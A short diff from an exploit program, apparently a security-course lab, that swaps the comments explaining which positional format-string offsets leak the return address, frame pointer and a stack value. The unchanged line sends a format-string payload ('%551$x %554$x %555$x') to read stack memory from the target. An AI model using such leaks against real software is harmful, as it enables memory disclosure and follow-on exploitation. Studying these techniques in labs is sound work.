@@ -157,9 +157,9 @@ int main(int argc, char* argv[]) {
    // main_loop function are stored. Use those offsets in the place of the
    // numbers in the format string below.
 
-   // Return address (551) value was found by just looking for the return address.
+   // Return address (555) value was found by just looking for the return address.
    // edp value (554) was found by using info frame to get current edp value and adding 0x30 (based on example)
-   // Stack value (555) was found by finding a random number in proximity to other 2 values (based on example)
+   // Stack value (551) was found by finding a random number in proximity to other 2 values (based on example)
    put_str("e %551$x %554$x %555$x\n");
    send();
 
